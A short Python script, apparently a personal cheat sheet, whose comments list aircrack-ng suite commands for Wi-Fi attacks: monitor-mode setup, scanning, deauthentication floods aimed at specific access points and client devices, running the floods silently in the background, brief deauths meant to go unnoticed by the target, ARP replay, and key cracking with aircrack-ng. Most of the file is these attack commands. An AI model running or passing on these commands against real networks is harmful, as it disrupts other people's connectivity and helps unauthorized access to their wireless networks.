#!/usr/bin/env python

import subprocess as s

interface = "wlan0"
airmon_interface = "wlan0mon"
"""
1.
Run airodump-ng on all interfaces around you
python airmon-ng.py   = Easy setup. After setup, run airodump-ng
airodump-ng --channel 11 --bssid 20:4E:7F:96:16:AA wlan0mon
2.
aireplay-ng --deauth 100000 -a 20:4E:7F:96:16:AA -c 00:C0:CA:96:85:27 wlan0mon
3.


2a_.
To run silently in the background,              redirect &> /dev/null &
aireplay-ng --deauth 100000 -a 20:4E:7F:96:16:AA -c 00:C0:CA:96:85:27 wlan0mon &> /dev/null &
to stop it either run
kill %1
killall aireplace-ng 
kill PID <id#>
"""
"""DISCOVER HIDDEN NETWORK
0. ifconfig wlan0 down
0a. iwconfig wlan0 mode monitor
0b. ifconfig wlan0 up
1. airodump-ng wlan0
2. airodump-ng --bssid <MAC> --channel 6

"""
"""
Deauth all clients on same network.
1.
airodump-ng --bssid 20:4E:7F:96:16:AA --channel 11 wlan0mon
2.
aireplay-ng --deauth 10000000 -a 20:4E:7F:96:16:AA wlan0mon
"""
"""
deauth 4 really quick target won't realize and will reconnect right away.
aireplay-ng --deauth 4 -a 60:E3:27:93:8B:1B -c 5C:AA:FD:C2:B1:34 wlan0mon
"""
"""
aireplay-ng --arpreplay -b BSSID -h STATION wlan0mon
aircrack-ng  ELPASO2arp-01.cap
"""

s.call("aircrack-ng FILENAME", shell=True)
